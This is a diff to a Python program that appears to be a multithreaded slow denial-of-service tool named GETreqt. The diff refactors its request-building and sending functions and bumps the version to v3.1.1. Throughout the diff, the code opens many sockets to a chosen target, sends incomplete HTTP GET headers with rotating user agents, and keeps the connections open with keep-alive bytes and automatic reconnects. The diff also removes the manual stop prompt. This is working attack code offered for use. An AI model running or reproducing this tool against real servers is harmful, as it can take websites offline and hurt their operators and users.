@@ -6,7 +6,7 @@ import colorama; import re
 
 colorama.init()
 
-currentVersionNumber = "v3.1.0"
+currentVersionNumber = "v3.1.1"
 VERSION_CHECK_URL = "https://raw.githubusercontent.com/SHUR1K-N/GETreqt-Multithreaded-Slow-DoS-Attack/master/versionfile.txt"
 BANNER1 = colored('''
    ▄████ ▓█████▄▄▄█████▓ ██▀███  ▓█████   █████  ▄▄▄█████▓
@@ -59,44 +59,49 @@ randomUserAgent = [
 successfulSends = 0
 
 
-def requestGET(target, port, length, currentSocket):
-    requestList = ["GET / HTTP/2.0",
-                   f"Host: {target}",
-                   # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
-                   f"User-Agent: {random.choice(randomUserAgent)}\r\n",
-                   ]
+def constructRequest():
+    requestHeaders = ["GET / HTTP/2.0",
+                      f"Host: {target}",
+                      # "Connection: keep-alive", # Not required with HTTP v1.1 & HTTP 2
+                      f"User-Agent: {random.choice(randomUserAgent)}\r\n",
+                      ]
     if arguments.wait:
         pass
     elif arguments.end:
-        requestList = requestList[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
-    request = "\r\n".join(requestList).encode("utf-8")
+        requestHeaders = requestHeaders[:3] + [f"User-Agent: {random.choice(randomUserAgent)}\r\n\r\n"]
+    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
+    return(GETrequest)
+
+
+def deployRequests(target, port, length, currentSocket, GETrequest):
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # sock.settimeout(5)
     try:
         sock.connect((target, port))
-        sock.send(request)
+        sock.send(GETrequest)
     except:
         try:
             sock.shutdown(socket.SHUT_RDWR)
             sock.close()
-            requestGET(target, port, length, currentSocket)
+            deployRequests(target, port, length, currentSocket, GETrequest)
         except:
-            requestGET(target, port, length, currentSocket)
+            deployRequests(target, port, length, currentSocket, GETrequest)
 
     if arguments.end:
         global successfulSends
         for i in range(1, length + 1):
             try:
-                sock.send(request)
+                sock.send(GETrequest)
                 successfulSends += 1
                 print(f"Successful send {successfulSends} from socket {currentSocket}\n", end="")
             except:
                 try:
                     sock.shutdown(socket.SHUT_RDWR)
                     sock.close()
-                    requestGET(target, port, length, currentSocket)
+                    deployRequests(target, port, length, currentSocket, GETrequest)
                 except:
-                    requestGET(target, port, length, currentSocket)
+                    deployRequests(target, port, length, currentSocket, GETrequest)
             randomDelay = random.random() * 5
             time.sleep(randomDelay)
         try:
@@ -109,21 +114,21 @@ def requestGET(target, port, length, currentSocket):
             except:
                 pass
         finally:
-                requestGET(target, port, length, currentSocket)
+                deployRequests(target, port, length, currentSocket, GETrequest)
 
     else:
         for i in range(1, length + 1):
             try:
                 # sock.send(bytes(str(f"{random.randint(1, 5000)}\r\n"), encoding="utf-8"))
                 sock.send(b" ")
-                print(f"Sent \"stay alive\" packet {i} / {length} to socket {currentSocket}\n", end="")
+                print(f"Sent \"don't you die on me\" packet {i} / {length} to socket {currentSocket}\n", end="")
             except:
                 try:
                     sock.shutdown(socket.SHUT_RDWR)
                     sock.close()
-                    requestGET(target, port, length, currentSocket)
+                    deployRequests(target, port, length, currentSocket, GETrequest)
                 except:
-                    requestGET(target, port, length, currentSocket)
+                    deployRequests(target, port, length, currentSocket, GETrequest)
             randomDelay = random.random() * 5
             time.sleep(randomDelay)
         try:
@@ -136,19 +141,16 @@ def requestGET(target, port, length, currentSocket):
             except:
                 pass
         finally:
-                requestGET(target, port, length, currentSocket)
+                deployRequests(target, port, length, currentSocket, GETrequest)
 
 
-def attackThreads(target, port, length, sockets):
+def attackThreads(target, port, length, sockets, GETrequest):
     threadingPool = []
     print()
     for currentSocket in range(sockets):
-        threadingPool.append(threading.Thread(target=requestGET, args=[target, port, length, currentSocket]))
+        threadingPool.append(threading.Thread(target=deployRequests, args=[target, port, length, currentSocket, GETrequest]))
         print(f"Creating {currentSocket} sockets to attack {target} via port {port}\n", end="")
         threadingPool[currentSocket].start()
-    print("\nAttacking... Press [Enter] to stop the attack.\n")
-    input()
-    print("Closing...")
     for thread in threadingPool:
         thread.join()
     print("You may now exit this window.")
@@ -177,4 +179,6 @@ if __name__ == "__main__":
     length = arguments.length
     sockets = arguments.threads
 
-    attackThreads(target, port, length, sockets)
+    GETrequest = constructRequest()
+
+    attackThreads(target, port, length, sockets, GETrequest)
